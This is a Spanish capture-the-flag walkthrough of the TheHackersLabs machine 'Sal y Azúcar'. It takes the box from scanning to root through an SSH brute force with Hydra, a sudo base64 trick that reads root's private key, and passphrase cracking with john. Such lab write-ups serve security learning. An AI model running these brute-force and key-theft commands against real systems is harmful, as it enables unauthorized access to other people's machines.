# Sal y Azúcar

Maquinas que vamos a utilizar Kali Linux y Sal y azúcar [https://thehackerslabs.com/sal-y-azucar/](https://thehackerslabs.com/sal-y-azucar/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20145.png)

**IP: 10.0.3.34**

```bash
nmap -p- -sS -sV -sC --open -min-rate=1000 -n -vvv -Pn 10.0.3.34
```

![image.png](./imagenes/image%20146.png)

- Miramos lo que corre atreves del puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%20147.png)
    
    ![image.png](./imagenes/image%20148.png)
    
    No parece haber nada significativo
    
- Vamos a intentar un Fuzzinf web
    
    ```bash
    gobuster dir -u [http://10.0.3.34/](./imagenes/http://10.0.3.34/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,html,txt
    ```
    
    ![image.png](./imagenes/image%20149.png)
    
    ![image.png](./imagenes/image%20150.png)
    

- No tenemos Ni usuario ni contraseña pero tenemos una pista de que la contraseña puede ser débil. Vamos ha hacer un ataque de fuerza bruta con Hydra al usuario y a la contraseña.
    
    ```bash
    hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.34
    ```
    
    ![image.png](./imagenes/image%20151.png)
    
    **login: info   password: qwerty**
    

- Accedemos por SSH con las credenciales optenidas.
    
    `ssh info@10.0.3.34` 
    
    `whoami`
    
    ![image.png](./imagenes/image%20152.png)
    

- Hacemos un listado de privilegios con **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%20153.png)
    
- Utilizamos la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) para encontrar vulnerabilidades.
    
    ![image.png](./imagenes/image%20154.png)
    
- Lo probamos
    
    `sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode`
    
    <aside>
    
    `sudo`: Ejecuta el comando con privilegios de administrador.
    
    `/usr/bin/base64 /root/.ssh/id_rsa`: Codifica el archivo `id_rsa` en Base64.
    
    `| base64 --decode`: Toma la salida codificada en Base64 y la decodifica nuevamente.
    
    </aside>
    
    ![image.png](./imagenes/image%20155.png)
    
    Copiamos el contenido del archivo **id_rsa y salimos el SSH**
    
- Nos creamos un archivo con las claves encriptadas de habíamos conseguido.
    
    `nano claves`
    
    ![image.png](./imagenes/image%20156.png)
    

- Usamos **John the Ripeer** para sacar la contraseña privada **a partir del fichero claves**.
    - Pasamos el archivo a un hash.
        
        ```bash
        ssh2john claves > key.hash  
        ```
        
        ![image.png](./imagenes/image%20157.png)
        
    - Usamos John para desencriptar el hash mediante un dicionario.
        
        ```bash
        john key.hash --wordlist /usr/share/wordlists/rockyou.txt
        ```
        
        ![image.png](./imagenes/image%20158.png)
        
        Ya tenemos la clave del usuario root : **honda1**
        

- Entramos en SSH como root.
    
    `sudo ssh [root@10.0.3.34](./imagenes/mailto:root@10.0.3.34) -i claves`
    
    ![image.png](./imagenes/image%20159.png)
   